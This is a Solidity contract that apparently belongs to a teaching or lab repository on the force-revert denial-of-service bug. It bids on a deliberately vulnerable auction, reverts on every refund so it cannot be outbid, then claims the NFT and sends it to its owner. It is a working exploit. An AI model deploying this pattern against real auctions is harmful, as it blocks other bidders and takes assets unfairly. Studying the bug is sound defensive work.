// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Ownable} from "../../lib/openzeppelin-contracts/contracts/access/Ownable.sol";
import {IERC721Receiver} from "../../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
import {VulnerableAuction} from "../../src/force-revert-dos/force-revert-dos.sol";

contract AttackAuction is IERC721Receiver, Ownable {
    VulnerableAuction private _auction;

    constructor(address auction)  {
        _auction = VulnerableAuction(auction);
    }

    function attack() external payable onlyOwner {
        _auction.bid{value: msg.value}();
    }

    function claimReward() external onlyOwner {
        _auction.claimReward();
    }

    receive() external payable {
        if (msg.sender == address(_auction)) {
            revert();
        }
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata 
    ) external returns (bytes4) {        
        _auction.safeTransferFrom(address(this), owner(), tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }
}
